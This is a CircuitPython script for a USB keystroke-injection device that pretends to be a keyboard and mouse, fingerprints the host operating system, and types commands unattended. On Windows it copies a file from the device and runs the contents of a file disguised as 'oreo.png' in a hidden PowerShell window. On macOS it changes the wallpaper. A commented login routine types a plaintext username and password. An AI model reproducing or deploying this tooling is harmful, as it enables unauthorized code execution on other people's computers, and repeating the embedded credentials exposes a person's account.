DRIVE_LABEL = "P"
WRITABLE = True
PICO = False
# SPDX-FileCopyrightText: 2018 Kattni Rembor for Adafruit Industries
#
# SPDX-License-Identifier: MIT
import board
from digitalio import DigitalInOut, Direction, Pull
import time
if not PICO: import neopixel

def log(s):
    #(f:=open("log.txt", "a")).write(s); f.close()
    print(s)
log("HI-2")
RED, GREEN, BLUE = 0,1,2
OFF, ON = 0,1
pixel = None if PICO else neopixel.NeoPixel(board.NEOPIXEL, 1) 

def LED(color, state):
    if PICO: return
    a = [0,0,0]
    if state: a[color] = 255
    pixel.fill(tuple(a))


log("HI-1")
"""CircuitPython Essentials HID Keyboard example"""


import storage
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode as kc
from adafruit_hid.mouse import Mouse


log("HI0" )
time.sleep(1)  # Sleep for a bit to avoid a race condition on some systems
kbd = Keyboard(usb_hid.devices)
kbly = KeyboardLayoutUS(kbd)  # We're in the US :)
mouse = Mouse(usb_hid.devices)


def sleep(n):
    start = time.monotonic()
    while not (time.monotonic() >= start + n):
        mouse.move(x=-100,y=-100)
        time.sleep(0.005)
def SEND(*keycodes):
    for i in keycodes:
        kbd.press(i)
        sleep(0.01)
    kbd.release_all()
def SPAM(n, *keys):
    for _ in range(n):
        SEND(*keys)
        LED(RED, ON)
        sleep(0.1)
        LED(RED,OFF)
        sleep(0.1)
def write(st):
    for i in st:
        kbly.write(i)
        mouse.move(x=-100,y=-100)

def f_winlogon():
    SPAM(14, kc.ESCAPE)
    SPAM(4, kc.SHIFT, kc.TAB)
    sleep(.4)
    SEND(kc.ENTER) 
    sleep(.4)

    write("karmanyaah.malhotra")
    sleep(.4)
    SEND(kc.TAB)
    write("belton78150\n")
    sleep(12) # 40 for new comps, 12 for prev logged in comps
    
def f_win(): #win
    log("HI1")
    SPAM(10, kc.ESCAPE)

    #while True:
    #   LED(RED,ON)
    #
    #   kbd.press(kc.CONTROL, kc.T)
    #  sleep(1)
    #   LED(RED,OFF)
        #sleep(1)
        
    log("HI2")
    sleep(3)
    kbd.send(kc.GUI, kc.X)
    sleep(0.9)
    kbd.send(kc.I)
    sleep(3)
    write('cp "$((Get-Volume -filesy ' + DRIVE_LABEL + ').DriveLetter):\o*" ~;start powershell -a "gc ~/oreo.png|powershell" -wi h;exit\n')
    og_state = kbd.led_on(Keyboard.LED_SCROLL_LOCK)
    while kbd.led_on(Keyboard.LED_SCROLL_LOCK) == og_state: sleep(.02)
    while kbd.led_on(Keyboard.LED_SCROLL_LOCK) != og_state: sleep(.02)

    #kbd.send(kc.ALT, kc.SHIFT, kc.M)
def f_chr(): # chrome
    SPAM(5, kc.ESCAPE)
    SEND(kc.ALT, kc.SHIFT, kc.M)
    sleep(3)
    SEND(kc.TAB)
    SPAM(10, kc.DOWN_ARROW)
    SEND(kc.ENTER)
    sleep(1)
    SEND(kc.SHIFT, kc.TAB)
    sleep(2)
    SEND(kc.CONTROL, kc.SPACE)
    sleep(1)
    SEND(kc.SHIFT, kc.TAB)
    sleep(1)
    SEND(kc.SPACE)
    sleep(1)
    SEND(kc.UP_ARROW)
    sleep(1)
    SEND(kc.ENTER)
    sleep(1)
    
 # __abs__
    SEND(kc.CONTROL, kc.W)

def f_mac():
    SPAM(10, kc.ESCAPE)
    SEND(kc.COMMAND, kc.SPACE)
    sleep(.3)
    write("terminal\n") # messes up when terminal window is already open, but srsly who will have that
    sleep(1)
    write('''osascript -e 'tell application "Finder" to set desktop picture to POSIX file "/Volumes/''' + DRIVE_LABEL + '''/oreo.png"'; exit\n''')
    sleep(3)
    SEND(kc.ENTER)
    sleep(1)
    SEND(kc.ENTER)
    sleep(1)
    SEND(kc.COMMAND, kc.Q)

    
    

sleep(0.1)
fpr = usb_hid.fpr()
if WRITABLE:
    with open('this', 'a') as f:
        f.write("".join("%02x" % b for b in fpr) + "\n")
sleep(1)
#f_winlogon()
if fpr[0] == 0:
    f_mac()
elif fpr[0] == 0x80:
    if fpr[54] == 255: f_win()
    if fpr[54] == 9: f_chr()

#write("https://docs.google.com/spreadsheets/d/1PwbZ9qDcFp-lsfXqmGaZO1mDOQxvpiPUU8AVCTKzeY8/edit\n")



LED(GREEN, ON)
log("HI3")
time.sleep(999999999)
